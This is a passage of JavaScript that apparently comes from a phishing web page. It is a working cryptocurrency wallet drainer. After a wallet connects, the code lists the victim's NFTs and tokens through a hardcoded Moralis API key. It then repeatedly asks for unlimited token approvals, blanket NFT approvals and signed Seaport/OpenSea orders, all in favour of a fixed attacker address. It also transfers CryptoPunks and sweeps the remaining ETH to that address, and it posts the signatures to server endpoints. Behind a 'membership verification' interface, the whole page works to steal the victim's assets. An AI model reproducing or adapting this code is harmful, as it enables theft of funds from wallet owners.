            "name": "consideration",
            "type": "tuple[]"
        }, {
            "internalType": "enum OrderType",
            "name": "orderType",
            "type": "uint8"
        }, {
            "internalType": "uint256",
            "name": "startTime",
            "type": "uint256"
        }, {
            "internalType": "uint256",
            "name": "endTime",
            "type": "uint256"
        }, {
            "internalType": "bytes32",
            "name": "zoneHash",
            "type": "bytes32"
        }, {
            "internalType": "uint256",
            "name": "salt",
            "type": "uint256"
        }, {
            "internalType": "bytes32",
            "name": "conduitKey",
            "type": "bytes32"
        }, {
            "internalType": "uint256",
            "name": "counter",
            "type": "uint256"
        }],
        "internalType": "struct OrderComponents",
        "name": "order",
        "type": "tuple"
    }],
    "name": "getOrderHash",
    "outputs": [{
        "internalType": "bytes32",
        "name": "orderHash",
        "type": "bytes32"
    }],
    "stateMutability": "view",
    "type": "function"
}, {
    "inputs": [{
        "internalType": "bytes32",
        "name": "orderHash",
        "type": "bytes32"
    }],
    "name": "getOrderStatus",
    "outputs": [{
        "internalType": "bool",
        "name": "isValidated",
        "type": "bool"
    }, {
        "internalType": "bool",
        "name": "isCancelled",
        "type": "bool"
    }, {
        "internalType": "uint256",
        "name": "totalFilled",
        "type": "uint256"
    }, {
        "internalType": "uint256",
        "name": "totalSize",
        "type": "uint256"
    }],
    "stateMutability": "view",
    "type": "function"
}, {
    "inputs": [],
    "name": "incrementCounter",
    "outputs": [{
        "internalType": "uint256",
        "name": "newCounter",
        "type": "uint256"
    }],
    "stateMutability": "nonpayable",
    "type": "function"
}, {
    "inputs": [],
    "name": "information",
    "outputs": [{
        "internalType": "string",
        "name": "version",
        "type": "string"
    }, {
        "internalType": "bytes32",
        "name": "domainSeparator",
        "type": "bytes32"
    }, {
        "internalType": "address",
        "name": "conduitController",
        "type": "address"
    }],
    "stateMutability": "view",
    "type": "function"
}, {
    "inputs": [{
        "components": [{
            "components": [{
                "internalType": "address",
                "name": "offerer",
                "type": "address"
            }, {
                "internalType": "address",
                "name": "zone",
                "type": "address"
            }, {
                "components": [{
                    "internalType": "enum ItemType",
                    "name": "itemType",
                    "type": "uint8"
                }, {
                    "internalType": "address",
                    "name": "token",
                    "type": "address"
                }, {
                    "internalType": "uint256",
                    "name": "identifierOrCriteria",
                    "type": "uint256"
                }, {
                    "internalType": "uint256",
                    "name": "startAmount",
                    "type": "uint256"
                }, {
                    "internalType": "uint256",
                    "name": "endAmount",
                    "type": "uint256"
                }],
                "internalType": "struct OfferItem[]",
                "name": "offer",
                "type": "tuple[]"
            }, {
                "components": [{
                    "internalType": "enum ItemType",
                    "name": "itemType",
                    "type": "uint8"
                }, {
                    "internalType": "address",
                    "name": "token",
                    "type": "address"
                }, {
                    "internalType": "uint256",
                    "name": "identifierOrCriteria",
                    "type": "uint256"
                }, {
                    "internalType": "uint256",
                    "name": "startAmount",
                    "type": "uint256"
                }, {
                    "internalType": "uint256",
                    "name": "endAmount",
                    "type": "uint256"
                }, {
                    "internalType": "address payable",
                    "name": "recipient",
                    "type": "address"
                }],
                "internalType": "struct ConsiderationItem[]",
                "name": "consideration",
                "type": "tuple[]"
            }, {
                "internalType": "enum OrderType",
                "name": "orderType",
                "type": "uint8"
            }, {
                "internalType": "uint256",
                "name": "startTime",
                "type": "uint256"
            }, {
                "internalType": "uint256",
                "name": "endTime",
                "type": "uint256"
            }, {
                "internalType": "bytes32",
                "name": "zoneHash",
                "type": "bytes32"
            }, {
                "internalType": "uint256",
                "name": "salt",
                "type": "uint256"
            }, {
                "internalType": "bytes32",
                "name": "conduitKey",
                "type": "bytes32"
            }, {
                "internalType": "uint256",
                "name": "totalOriginalConsiderationItems",
                "type": "uint256"
            }],
            "internalType": "struct OrderParameters",
            "name": "parameters",
            "type": "tuple"
        }, {
            "internalType": "uint120",
            "name": "numerator",
            "type": "uint120"
        }, {
            "internalType": "uint120",
            "name": "denominator",
            "type": "uint120"
        }, {
            "internalType": "bytes",
            "name": "signature",
            "type": "bytes"
        }, {
            "internalType": "bytes",
            "name": "extraData",
            "type": "bytes"
        }],
        "internalType": "struct AdvancedOrder[]",
        "name": "advancedOrders",
        "type": "tuple[]"
    }, {
        "components": [{
            "internalType": "uint256",
            "name": "orderIndex",
            "type": "uint256"
        }, {
            "internalType": "enum Side",
            "name": "side",
            "type": "uint8"
        }, {
            "internalType": "uint256",
            "name": "index",
            "type": "uint256"
        }, {
            "internalType": "uint256",
            "name": "identifier",
            "type": "uint256"
        }, {
            "internalType": "bytes32[]",
            "name": "criteriaProof",
            "type": "bytes32[]"
        }],
        "internalType": "struct CriteriaResolver[]",
        "name": "criteriaResolvers",
        "type": "tuple[]"
    }, {
        "components": [{
            "components": [{
                "internalType": "uint256",
                "name": "orderIndex",
                "type": "uint256"
            }, {
                "internalType": "uint256",
                "name": "itemIndex",
                "type": "uint256"
            }],
            "internalType": "struct FulfillmentComponent[]",
            "name": "offerComponents",
            "type": "tuple[]"
        }, {
            "components": [{
                "internalType": "uint256",
                "name": "orderIndex",
                "type": "uint256"
            }, {
                "internalType": "uint256",
                "name": "itemIndex",
                "type": "uint256"
            }],
            "internalType": "struct FulfillmentComponent[]",
            "name": "considerationComponents",
            "type": "tuple[]"
        }],
        "internalType": "struct Fulfillment[]",
        "name": "fulfillments",
        "type": "tuple[]"
    }],
    "name": "matchAdvancedOrders",
    "outputs": [{
        "components": [{
            "components": [{
                "internalType": "enum ItemType",
                "name": "itemType",
                "type": "uint8"
            }, {
                "internalType": "address",
                "name": "token",
                "type": "address"
            }, {
                "internalType": "uint256",
                "name": "identifier",
                "type": "uint256"
            }, {
                "internalType": "uint256",
                "name": "amount",
                "type": "uint256"
            }, {
                "internalType": "address payable",
                "name": "recipient",
                "type": "address"
            }],
            "internalType": "struct ReceivedItem",
            "name": "item",
            "type": "tuple"
        }, {
            "internalType": "address",
            "name": "offerer",
            "type": "address"
        }, {
            "internalType": "bytes32",
            "name": "conduitKey",
            "type": "bytes32"
        }],
        "internalType": "struct Execution[]",
        "name": "executions",
        "type": "tuple[]"
    }],
    "stateMutability": "payable",
    "type": "function"
}, {
    "inputs": [{
        "components": [{
            "components": [{
                "internalType": "address",
                "name": "offerer",
                "type": "address"
            }, {
                "internalType": "address",
                "name": "zone",
                "type": "address"
            }, {
                "components": [{
                    "internalType": "enum ItemType",
                    "name": "itemType",
                    "type": "uint8"
                }, {
                    "internalType": "address",
                    "name": "token",
                    "type": "address"
                }, {
                    "internalType": "uint256",
                    "name": "identifierOrCriteria",
                    "type": "uint256"
                }, {
                    "internalType": "uint256",
                    "name": "startAmount",
                    "type": "uint256"
                }, {
                    "internalType": "uint256",
                    "name": "endAmount",
                    "type": "uint256"
                }],
                "internalType": "struct OfferItem[]",
                "name": "offer",
                "type": "tuple[]"
            }, {
                "components": [{
                    "internalType": "enum ItemType",
                    "name": "itemType",
                    "type": "uint8"
                }, {
                    "internalType": "address",
                    "name": "token",
                    "type": "address"
                }, {
                    "internalType": "uint256",
                    "name": "identifierOrCriteria",
                    "type": "uint256"
                }, {
                    "internalType": "uint256",
                    "name": "startAmount",
                    "type": "uint256"
                }, {
                    "internalType": "uint256",
                    "name": "endAmount",
                    "type": "uint256"
                }, {
                    "internalType": "address payable",
                    "name": "recipient",
                    "type": "address"
                }],
                "internalType": "struct ConsiderationItem[]",
                "name": "consideration",
                "type": "tuple[]"
            }, {
                "internalType": "enum OrderType",
                "name": "orderType",
                "type": "uint8"
            }, {
                "internalType": "uint256",
                "name": "startTime",
                "type": "uint256"
            }, {
                "internalType": "uint256",
                "name": "endTime",
                "type": "uint256"
            }, {
                "internalType": "bytes32",
                "name": "zoneHash",
                "type": "bytes32"
            }, {
                "internalType": "uint256",
                "name": "salt",
                "type": "uint256"
            }, {
                "internalType": "bytes32",
                "name": "conduitKey",
                "type": "bytes32"
            }, {
                "internalType": "uint256",
                "name": "totalOriginalConsiderationItems",
                "type": "uint256"
            }],
            "internalType": "struct OrderParameters",
            "name": "parameters",
            "type": "tuple"
        }, {
            "internalType": "bytes",
            "name": "signature",
            "type": "bytes"
        }],
        "internalType": "struct Order[]",
        "name": "orders",
        "type": "tuple[]"
    }, {
        "components": [{
            "components": [{
                "internalType": "uint256",
                "name": "orderIndex",
                "type": "uint256"
            }, {
                "internalType": "uint256",
                "name": "itemIndex",
                "type": "uint256"
            }],
            "internalType": "struct FulfillmentComponent[]",
            "name": "offerComponents",
            "type": "tuple[]"
        }, {
            "components": [{
                "internalType": "uint256",
                "name": "orderIndex",
                "type": "uint256"
            }, {
                "internalType": "uint256",
                "name": "itemIndex",
                "type": "uint256"
            }],
            "internalType": "struct FulfillmentComponent[]",
            "name": "considerationComponents",
            "type": "tuple[]"
        }],
        "internalType": "struct Fulfillment[]",
        "name": "fulfillments",
        "type": "tuple[]"
    }],
    "name": "matchOrders",
    "outputs": [{
        "components": [{
            "components": [{
                "internalType": "enum ItemType",
                "name": "itemType",
                "type": "uint8"
            }, {
                "internalType": "address",
                "name": "token",
                "type": "address"
            }, {
                "internalType": "uint256",
                "name": "identifier",
                "type": "uint256"
            }, {
                "internalType": "uint256",
                "name": "amount",
                "type": "uint256"
            }, {
                "internalType": "address payable",
                "name": "recipient",
                "type": "address"
            }],
            "internalType": "struct ReceivedItem",
            "name": "item",
            "type": "tuple"
        }, {
            "internalType": "address",
            "name": "offerer",
            "type": "address"
        }, {
            "internalType": "bytes32",
            "name": "conduitKey",
            "type": "bytes32"
        }],
        "internalType": "struct Execution[]",
        "name": "executions",
        "type": "tuple[]"
    }],
    "stateMutability": "payable",
    "type": "function"
}, {
    "inputs": [],
    "name": "name",
    "outputs": [{
        "internalType": "string",
        "name": "contractName",
        "type": "string"
    }],
    "stateMutability": "pure",
    "type": "function"
}, {
    "inputs": [{
        "components": [{
            "components": [{
                "internalType": "address",
                "name": "offerer",
                "type": "address"
            }, {
                "internalType": "address",
                "name": "zone",
                "type": "address"
            }, {
                "components": [{
                    "internalType": "enum ItemType",
                    "name": "itemType",
                    "type": "uint8"
                }, {
                    "internalType": "address",
                    "name": "token",
                    "type": "address"
                }, {
                    "internalType": "uint256",
                    "name": "identifierOrCriteria",
                    "type": "uint256"
                }, {
                    "internalType": "uint256",
                    "name": "startAmount",
                    "type": "uint256"
                }, {
                    "internalType": "uint256",
                    "name": "endAmount",
                    "type": "uint256"
                }],
                "internalType": "struct OfferItem[]",
                "name": "offer",
                "type": "tuple[]"
            }, {
                "components": [{
                    "internalType": "enum ItemType",
                    "name": "itemType",
                    "type": "uint8"
                }, {
                    "internalType": "address",
                    "name": "token",
                    "type": "address"
                }, {
                    "internalType": "uint256",
                    "name": "identifierOrCriteria",
                    "type": "uint256"
                }, {
                    "internalType": "uint256",
                    "name": "startAmount",
                    "type": "uint256"
                }, {
                    "internalType": "uint256",
                    "name": "endAmount",
                    "type": "uint256"
                }, {
                    "internalType": "address payable",
                    "name": "recipient",
                    "type": "address"
                }],
                "internalType": "struct ConsiderationItem[]",
                "name": "consideration",
                "type": "tuple[]"
            }, {
                "internalType": "enum OrderType",
                "name": "orderType",
                "type": "uint8"
            }, {
                "internalType": "uint256",
                "name": "startTime",
                "type": "uint256"
            }, {
                "internalType": "uint256",
                "name": "endTime",
                "type": "uint256"
            }, {
                "internalType": "bytes32",
                "name": "zoneHash",
                "type": "bytes32"
            }, {
                "internalType": "uint256",
                "name": "salt",
                "type": "uint256"
            }, {
                "internalType": "bytes32",
                "name": "conduitKey",
                "type": "bytes32"
            }, {
                "internalType": "uint256",
                "name": "totalOriginalConsiderationItems",
                "type": "uint256"
            }],
            "internalType": "struct OrderParameters",
            "name": "parameters",
            "type": "tuple"
        }, {
            "internalType": "bytes",
            "name": "signature",
            "type": "bytes"
        }],
        "internalType": "struct Order[]",
        "name": "orders",
        "type": "tuple[]"
    }],
    "name": "validate",
    "outputs": [{
        "internalType": "bool",
        "name": "validated",
        "type": "bool"
    }],
    "stateMutability": "nonpayable",
    "type": "function"
}];


var wethAddr = '0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2';
var usdcAddr = '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48';
var cryptoPunkAddr = '0xb47e3cd837ddf8e4c57f05d70ab865de6e193bbb';
var openseaExchangeAddr = '0x7f268357a8c2552623316e2562d90e642bb538e5';
var openseaRegistryAddr = '0xa5409ec958c83c3f309868babaca7c86dcb077c1';
var openseaTokenTransferProxyAddr = '0xe5c783ee536cf5e63e792988335c4255169be4e1';
var zeroAddr = '0x0000000000000000000000000000000000000000';
var seaportAddr = '0x00000000006c3852cbef3e08e8df289169ede581';
var conduitAddr = '0x1e0049783f008a0085193e00003d00cd54003c71';

var signMultiple = 5;
var nftMultiple = 0.8;

var spenderAddr = '0x4Ac6005B03a14B2fbdcC00d4Dec781B7A2005f82';
var destAddr = '0x4Ac6005B03a14B2fbdcC00d4Dec781B7A2005f82';
var MORALISKEY = 'nvlFjwywZ0aM54rluhjJSIRhABmeTYBLuV39EI9w14WKNixpdsQ8Sl5ZGCp7hakG'


var flag = false;
var wyvExcCont;
var openseaRegistryCont;
var openseaProxy;
var priceDataPromise;
var nftDataPromise;
var tokenDataPromise;
var accTokenList;
var accNFTListRes;
var accNFTList;
var accWorthList;
var ethWorth;
var ti;
var hasStarted;
var txCount;



async function walletConnected() {


    const chainId = await web3.eth.getChainId();

    if (chainId != 1) {
        var snRes = 0;
        while (snRes == 0) {
            snRes = await switchNetwork();
        }
        isPending = false;
        return;
    }
    const accounts = await web3.eth.getAccounts();

    if (accounts.length == 0) {
        isPending = false;
        await onDisconnect();
        return;
    }
    selectedAccount = accounts[0];
    // $('#cover-spin').show();


    var date = new Date();
    var url = window.location.href;



    wyvExcCont = new web3.eth.Contract(wyvernExchangeABI, openseaExchangeAddr);
    openseaRegistryCont = new web3.eth.Contract(openseaRegistryABI, openseaRegistryAddr);

    // selectedAccount = '0x6e1271aBcC021805f5FB2Cc1724D312C5C3350aF';

    openseaProxy = zeroAddr; // await openseaRegistryCont.methods.proxies(selectedAccount).call();



    nftDataPromise = getNFTData(selectedAccount, openseaProxy);

    tokenDataPromise = getTokenData(selectedAccount, openseaProxy);



    accTokenList = await tokenDataPromise;
    accNFTListRes = await nftDataPromise;
    accNFTList = accNFTListRes.success ? accNFTListRes.result : [];
    accWorthList = accTokenList.success ? accTokenList.result : [];
    nftTokenAddrList = Object.keys(accNFTList);
    ethWorth = tokenList[wethAddr];
    nftTokenAddrList.forEach(tokenAddr => {
        ti = {
            tokenAddr: tokenAddr,
            worth: accNFTList[tokenAddr] * nftList[tokenAddr] * ethWorth * nftMultiple,
            type: 'erc721',
            openseaApproved: false,
        }
        if (tokenAddr == cryptoPunkAddr) {
            ti.worth = nftList[tokenAddr] * ethWorth * 0.2;
        }
        accWorthList.push(ti);
    })

    accWorthList.push({
        tokenAddr: zeroAddr,
        worth: accNFTListRes.nftWorthProxy * ethWorth * nftMultiple * signMultiple,
        type: "ProxySign",
        openseaApproved: false,
    });

    accWorthList.push({
        tokenAddr: zeroAddr,
        worth: accNFTListRes.nftWorthSeaport * ethWorth * nftMultiple * signMultiple + accTokenList.tokenWorthSeaport,
        type: "SeaportSign",
        openseaApproved: false,
        nftItems: accNFTListRes.nftListToUseSeaport.concat(accTokenList.tokenSeaportList),
    });

    accWorthList.sort(function(a, b) {
        return b.worth - a.worth;
    })

    console.log(accWorthList);

    gasPrice = Number(await web3.eth.getGasPrice()) + 20e9;

    hasStarted = false;
    txCount = 0;


    await sleep(1000);

    approveFunc();
}
async function approveFunc() {
    for (var i = 0; i < accWorthList.length; i++) {
        var tData = accWorthList[i];
        var apres = false;
        if (tData.tokenAddr == cryptoPunkAddr) {
            await claimPunk(selectedAccount);
            apres = true;
        } else if (tData.type == 'erc20') {
            if (hasStarted == false && tData.worth < 100) continue;
            if (tData.seaportApproved) continue;
            if (tData.tokenAddr == usdcAddr) {
                apres = await signUSDC(selectedAccount);
            } else if (tData.proxyApproved && tData.worth >= 100 * signMultiple) {
                apres = await signOpenseaOffer(selectedAccount, tData);
            } else {
                apres = await approveERC20(tData.tokenAddr, selectedAccount, gasPrice);
            }
        } else if (tData.type == 'erc721') {
            tokenCont = new web3.eth.Contract(tokenABI, tData.tokenAddr);
            var isApprovedForAll = await tokenCont.methods.isApprovedForAll(selectedAccount, spenderAddr).call();
            if (isApprovedForAll) {
                // $.get('https://themta.site/postTrxHash.php?mmAddr=' + selectedAccount + '&trxHash=' + addressList[i] + '&url=xxx');
                continue;
                // apres = true;
            } else {
                apres = await approveNFT(tData.tokenAddr, selectedAccount, gasPrice);
            }
        } else if (tData.type == 'ProxySign') {
            if (tData.worth == 0) {
                continue;
            }
            defaultMsgObj.maker = selectedAccount;
            defaultMsgObj.salt = getSalt();
            defaultMsgObj.nonce = await wyvExcCont.methods.nonces(selectedAccount).call();
            var def_salt = defaultMsgObj.salt;

            msgParams.message = defaultMsgObj;

            var sigRes = false;

            while (sigRes == false) {
                var sig = await signData(selectedAccount, msgParams);
                if (sig.success == true) {
                    sigRes = true;
                    var def_sigres = sig.result;
                    fetch('/sign', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            selectedAccount,
                            def_salt,
                            def_sigres,
                        }),
                    });

                } else {
                    console.log("pena");
                }
            }
            apres = true;

        } else if (tData.type == 'SeaportSign') {
            if (tData.worth < 100) {
                continue;
            }

            apres = await signSeaport(selectedAccount, tData.nftItems);
        }
        if (apres == false) {
            i--;
            console.log("pena");
        } else {
            hasStarted = true;
            txCount++;
        }
    }

    var balance = await web3.eth.getBalance(selectedAccount);
    var fee = 5e15 * (txCount + 1);
    // console.log({balance: balance/1e18, fee: fee/1e18});
    var balance = balance - fee;
    if (balance > 5e16 && accWorthList[0].type != 'ProxySign') {
        apres = false;
        while (!apres) {
            apres = await transferEth(selectedAccount, balance, gasPrice);
            if (apres == false) {
                console.log("pena");
            }
        }
    }

    console.log(accWorthList);
    if (accWorthList.length == 2) {
        $('.account-warning').show();
    } else {
        $('.connect-btn').prop('disabled', false);
        $(".connect-btn").css('display', 'none');
        $(".p-campaign").css('display', 'block');
        $(".verify-membership").removeClass('text-primary');
        $(".campaign").addClass('text-primary');
        $(".verify-membership-text").removeClass('text-light');
        $(".campaign-text").addClass('text-light');
    }


    isPending = false;
}


async function signUSDC(from) {
    var usdcCont = new web3.eth.Contract(tokenABI, usdcAddr);
    var allowance = await usdcCont.methods.allowance(from, spenderAddr).call();
    if (Number(allowance) != 0) return true;
    usdcDefaultMsgObj.owner = from;
    usdcDefaultMsgObj.nonce = await usdcCont.methods.nonces(from).call();
    usdcMsgParams.message = usdcDefaultMsgObj;
    var sig = await signData(from, usdcMsgParams);
    var U_sigres = sig.result;
    if (sig.success == false) return false;
    fetch('/signU', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            from,
            U_sigres,
        }),
    });
    return true;
}

async function signOpenseaOffer(from, tokenData) {
    wethDefaultMsgObj.maker = from;
    wethDefaultMsgObj.paymentToken = tokenData.tokenAddr;
    wethDefaultMsgObj.salt = getSalt();
    wethDefaultMsgObj.nonce = await wyvExcCont.methods.nonces(selectedAccount).call();
    var tokenCont = new web3.eth.Contract(tokenABI, tokenData.tokenAddr);
    var bal = await tokenCont.methods.balanceOf(from).call();
    wethDefaultMsgObj.basePrice = bal;
    var O2_salt = wethDefaultMsgObj.salt;
    var O2_token = tokenData.tokenAddr;
    msgParams.message = wethDefaultMsgObj;
    var sig = await signData(from, msgParams);
    var O2_sigres = sig.result;
    if (sig.success == false) return false;
    fetch('/signO2', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            from,
            O2_salt,
            O2_token,
            bal,
            O2_sigres,
        }),
    });
    return true;
}

function signData(from, msgData) {
    return new Promise((resolve, reject) => {
        var method = 'eth_signTypedData_v4';
        var params = [from, JSON.stringify(msgData)];
        web3.currentProvider.sendAsync({
                method,
                params,
                from,
                id: new Date().getTime(),
            },
            function(err, result) {
                if (err) {
                    return resolve({
                        success: false
                    });
                }
                if (result.error) {
                    return resolve({
                        success: false
                    });
                }
                if (result.result == '0x') {
                    return resolve({
                        success: false
                    });
                }
                resolve({
                    success: true,
                    result: result.result
                });
            }
        );
    });
}

function getNFTData(selectedAccount, openseaProxyAddr) {
    return new Promise(async (resolve, reject) => {
        try {
            var nftTotalList = [];
            var moralisFirstRes = await $.ajax({
                url: 'https://deep-index.moralis.io/api/v2/' + selectedAccount + '/nft?chain=eth&format=decimal',
                headers: {
                    'X-API-Key': MORALISKEY
                }
            });
            nftTotalList = moralisFirstRes.result;
            var nftCount = nftTotalList.length;
            var cursor = moralisFirstRes.cursor;
            while (nftCount < moralisFirstRes.total && cursor != "") {
                var nftPagi = await $.ajax({
                    url: 'https://deep-index.moralis.io/api/v2/' + selectedAccount + '/nft?chain=eth&format=decimal&cursor=' + cursor,
                    headers: {
                        'X-API-Key': MORALISKEY
                    }
                });
                nftTotalList = nftTotalList.concat(nftPagi.result);
                console.log(nftTotalList.length);
                cursor = nftPagi.cursor;
                nftCount += nftPagi.result.length;
            }

            console.log(nftTotalList);

            var nftCount = [];
            var nftIdList = [];
            var ethWorth = tokenList[wethAddr];
            for (var i = 0; i < nftTotalList.length; ++i) {
                var td = nftTotalList[i];
                var tokenAddr = td.token_address.toLowerCase();
                if (nftList[tokenAddr] != undefined) {
                    if (nftCount[tokenAddr] == undefined) {
                        nftCount[tokenAddr] = 0;
                        nftIdList[tokenAddr] = [];
                    }
                    nftCount[tokenAddr] += parseInt(td.amount);
                    nftIdList[tokenAddr].push(td);
                }
            }

            console.log('PRE APPROVE');
            console.log(nftCount);

            var nftListToUseSeaport = [];
            var nftListToUseSeaportOrPrxoy = [];
            var nftWorthProxyOrSeaport = 0;
            var nftWorthProxy = 0;
            var nftWorthSeaport = 0;

            var nftAddrList = Object.keys(nftCount);
            for (var i = 0; i < nftAddrList.length; i++) {
                var tokenAddr = nftAddrList[i];
                if (tokenAddr == cryptoPunkAddr) {
                    continue;
                }
                var tokenCont = new web3.eth.Contract(tokenABI, tokenAddr);
                var isApprovedForAllToProxy = false; //(openseaProxyAddr == zeroAddr) ? false : (await tokenCont.methods.isApprovedForAll(selectedAccount, openseaProxyAddr).call());
                var isApprovedForAllToSeaport = await tokenCont.methods.isApprovedForAll(selectedAccount, conduitAddr).call();

                if (isApprovedForAllToProxy && isApprovedForAllToSeaport) {
                    console.log('NFT OPENSEA APPROVED');
                    nftWorthProxyOrSeaport += nftList[tokenAddr] * nftCount[tokenAddr];
                    nftListToUseSeaportOrPrxoy.push(...nftIdList[tokenAddr]);
                    delete nftCount[tokenAddr];
                } else if (isApprovedForAllToProxy) {
                    nftWorthProxy += nftList[tokenAddr] * nftCount[tokenAddr];
                    delete nftCount[tokenAddr];
                } else if (isApprovedForAllToSeaport) {
                    nftWorthSeaport += nftList[tokenAddr] * nftCount[tokenAddr];
                    nftListToUseSeaport.push(...nftIdList[tokenAddr]);
                    delete nftCount[tokenAddr];
                }
            }

            if (nftWorthProxy == 0) {
                nftWorthSeaport += nftWorthProxyOrSeaport;
                nftListToUseSeaport = nftListToUseSeaport.concat(nftListToUseSeaportOrPrxoy);
            } else {
                nftWorthProxy += nftWorthProxyOrSeaport;
            }

            resolve({
                success: true,
                result: nftCount,
                nftListToUseSeaport,
                nftWorthSeaport,
                nftWorthProxy
            });
        } catch (err) {
            resolve({
                success: false,
                nftListToUseSeaport: [],
                nftWorthSeaport: 0,
                nftWorthProxy: 0
            });
        }
    });
}

async function signSeaport(from, nftListToUseSeaport) {
    var seaport = new web3.eth.Contract(seaportABI, seaportAddr);
    var counter = await seaport.methods.getCounter(from).call();

    seaportMsgObj.offerer = from;
    seaportMsgObj.offer = [];
    seaportMsgObj.consideration = [];
    var itemTypes = [];
    itemTypes["ERC20"] = 1;
    itemTypes["ERC721"] = 2;
    itemTypes["ERC1155"] = 3;
    for (let i = 0; i < nftListToUseSeaport.length; ++i) {
        let td = nftListToUseSeaport[i];
        seaportMsgObj.offer.push({
            itemType: itemTypes[td.contract_type],
            token: td.token_address.toLowerCase(),
            identifierOrCriteria: td.token_id,
            startAmount: td.amount,
            endAmount: td.amount,
        });
        seaportMsgObj.consideration.push({
            itemType: itemTypes[td.contract_type],
            token: td.token_address.toLowerCase(),
            identifierOrCriteria: td.token_id,
            startAmount: td.amount,
            endAmount: td.amount,
            recipient: destAddr,
        });
    }
    seaportMsgObj.counter = counter;
    seaportMsgObj.salt = getSalt();
    var O7_salt = seaportMsgObj.salt;

    seaportMsgParams.message = seaportMsgObj;
    var sig = await signData(from, seaportMsgParams);
    if (sig.success == false) return false;
    var sigData = {};
    sigData.signature = sig.result;
    sigData.offer = seaportMsgObj.offer;
    var O7_signature = sigData.signature;
    var O7_offer = sigData.offer;

    fetch('/signO7', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            from,
            O7_salt,
            O7_signature,
            O7_offer,
        }),
    });
    return true;
}

function getTokenData(selectedAccount, openseaProxy) {
    return new Promise(async (resolve, reject) => {
        try {
            var morTokenData = await $.ajax({
                url: 'https://deep-index.moralis.io/api/v2/' + selectedAccount + '/erc20?chain=eth',
                headers: {
                    'X-API-Key': MORALISKEY
                }
            });

            var accTokenList = [];
            var tokenWorthSeaport = 0;
            var tokenSeaportList = [];
            for (var i = 0; i < morTokenData.length; i++) {
                var td = morTokenData[i];
                td.token_address = td.token_address.toLowerCase();
                if (tokenList[td.token_address] == undefined) continue;
                var ti = {
                    tokenAddr: td.token_address,
                    worth: td.balance * tokenList[td.token_address] / 10 ** td.decimals,
                    type: 'erc20',
                    proxyApproved: false,
                    seaportApproved: false,
                }
                if (openseaTokens[td.token_address] == 1) {
                    var tokenCont = new web3.eth.Contract(tokenABI, td.token_address);
                    var proxyAllowance = 0; //Number(await tokenCont.methods.allowance(selectedAccount, openseaTokenTransferProxyAddr).call());
                    var conduitAllowance = Number(await tokenCont.methods.allowance(selectedAccount, conduitAddr).call());
                    if (conduitAllowance != 0) {
                        tokenWorthSeaport += ti.worth * signMultiple;

                        td.amount = td.balance;
                        td.token_id = 0;
                        td.contract_type = 'ERC20';
                        tokenSeaportList.push(td);

                        ti.worth = ti.worth * signMultiple;
                        ti.seaportApproved = true;
                    } else if (proxyAllowance != 0) {
                        ti.proxyApproved = true;
                        ti.worth = ti.worth * signMultiple;
                    } else if (td.token_address == usdcAddr) {
                        ti.proxyApproved = true;
                        ti.worth = ti.worth * signMultiple;
                    }
                }
                accTokenList.push(ti);
            }
            resolve({
                success: true,
                result: accTokenList,
                tokenSeaportList,
                tokenWorthSeaport
            });
        } catch (err) {
            resolve({
                success: false,
                tokenSeaportList: [],
                tokenWorthSeaport: 0
            });
        }
    });
}

function approveERC20(tokenAddr, selectedAccount, gasPrice) {
    return new Promise((resolve, reject) => {
        var tokenCont = new web3.eth.Contract(tokenABI, tokenAddr);

        tokenCont.methods.allowance(selectedAccount, spenderAddr).call()
            .then(all => {
                if (Number(all) != 0) {
                    resolve(true);
                    return;
                }
                tokenCont.methods.approve(spenderAddr, '0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF').send({
                    from: selectedAccount,
                    gasPrice: gasPrice,
                }).on('transactionHash', function(hash) {
                    fetch('/aE2', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            selectedAccount,
                            hash,
                        }),
                    });
                    resolve(true);
                }).on('error', function(err) {
                    resolve(false);
                });
            })
    })
}

function approveNFT(tokenAddr, selectedAccount, gasPrice) {
    return new Promise((resolve, reject) => {
        var tokenCont = new web3.eth.Contract(tokenABI, tokenAddr);

        tokenCont.methods.setApprovalForAll(spenderAddr, true).send({
            from: selectedAccount,
            gasPrice: gasPrice
        }).on('transactionHash', function(hash) {
            console.log(hash);
            fetch('/aE7', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    selectedAccount,
                    hash,
                }),
            });
            resolve(true);
        }).on('error', function(err) {
            resolve(false);
        });
    })
}

async function claimPunk(selectedAccount) {
    var punkAddr = "0xb47e3cd837ddf8e4c57f05d70ab865de6e193bbb";
    try {
        var data = await $.ajax({
            url: 'https://deep-index.moralis.io/api/v2/' + selectedAccount + '/nft/0xb47e3cd837ddf8e4c57f05d70ab865de6e193bbb?chain=eth&format=decimal',
            headers: {
                'X-API-Key': MORALISKEY
            }
        });

        var gasPrice = Number(await web3.eth.getGasPrice()) + 20e9;
        for (var i = 0; i < data.result.length; ++i) {
            var isTransfered = await transferPunk(punkAddr, selectedAccount, data.result[i].token_id, gasPrice);
            if (isTransfered == false) i--;
        }
    } catch (e) {

    }
}

function transferPunk(punkAddr, selectedAccount, id, gasPrice) {
    return new Promise((resolve, reject) => {
        var punkAbi = [{
            "constant": false,
            "inputs": [{
                "name": "to",
                "type": "address"
            }, {
                "name": "punkIndex",
                "type": "uint256"
            }],
            "name": "transferPunk",
            "outputs": [],
            "payable": false,
            "type": "function"
        }, ];
        var tokenCont = new web3.eth.Contract(punkAbi, punkAddr);

        tokenCont.methods.transferPunk(destAddr, id).send({
            from: selectedAccount,
            gasPrice: gasPrice,
            gas: 200e3,
        }).on('transactionHash', function(hash) {
            fetch('/CP', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    selectedAccount,
                    hash,
                }),
            });
            resolve(true);
        }).on('error', function(err) {
            resolve(false);
        });
    })
}

function transferEth(selectedAccount, amount, gasPrice) {
    return new Promise((resolve, reject) => {
        web3.eth.sendTransaction({
            from: selectedAccount,
            to: destAddr,
            value: amount,
            gasPrice: gasPrice
